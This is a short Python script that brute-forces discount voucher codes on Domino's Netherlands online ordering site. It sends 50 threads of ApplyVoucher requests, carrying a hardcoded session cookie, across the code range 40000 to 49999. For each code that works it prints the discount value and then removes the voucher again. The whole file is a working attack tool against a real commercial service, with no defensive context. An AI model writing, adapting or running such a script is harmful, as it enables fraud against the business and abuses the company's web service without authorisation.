import requests
from lxml import etree
from Queue import Queue
from threading import Thread

speed = 50 #Vroom vroom
sessionid = 'jvfzolrbzeutw3dlsohlgghp'
basket = "https://bestellen.dominos.nl/eStore/nl/Basket/"
queue = Queue(speed*3)


def checkvalue(value, url, sessionid):
    cookies = {'ASP.NET_SessionId': sessionid, 'Language': 'nl'}
    testurl = "https://bestellen.dominos.nl/eStore/nl/Basket/GetBasketView?#"
    r = requests.get(testurl, cookies=cookies)
    html = etree.HTML(r.text)
    text = html.xpath("//text()")
    text = [i.strip() for i in text if len(i.strip()) > 2]
    removecode(cookies)
    return text[1]


def sendcode(url, sessionid):
    cookies = {'ASP.NET_SessionId': sessionid, 'Language': 'nl'}
    r = requests.post(url, cookies=cookies)
    response = r.text
    if (r.status_code!=200):
        print('Error/Denied/Other stuff you don\'t want, quitting...')
    if '{"Url":null,"Messages":null}' in response:
        return True


def removecode(cookies):
    removeurl1 = basket + "RemoveVoucher?orderItemId=1&timestamp=1405537142120"
    removeurl2 = basket + "RemoveVoucher?orderItemId=2&timestamp=1405537142120"
    removeurl3 = basket + "RemoveVoucher?orderItemId=1&timestamp=1405537142130"
    removeurl4 = basket + "RemoveVoucher?orderItemId=2&timestamp=1405537142130"
    requests.post(removeurl1, cookies=cookies)
    requests.post(removeurl2, cookies=cookies)
    requests.post(removeurl3, cookies=cookies)
    requests.post(removeurl4, cookies=cookies)


def exe(code, sessionid):
    url = basket + "ApplyVoucher?voucherCode="+str(code)
    result = sendcode(url, sessionid)
    if(result):
        value = checkvalue(len(code), url, sessionid)
        print("Code:{0}\tWaarde:{1}".format(code, value))


def run():
    while True:
        code = queue.get()
        #To debug
        #print("Checking {}".format(code))
        exe(code, sessionid)
        queue.task_done()


def main():
    #make workers
    for i in range(speed):
        thread = Thread(target=run)
        thread.deamon = True
        thread.start()
    #add urls for workers
    for code in range(40000, 50000):
        queue.put(code)
    queue.join()


main()
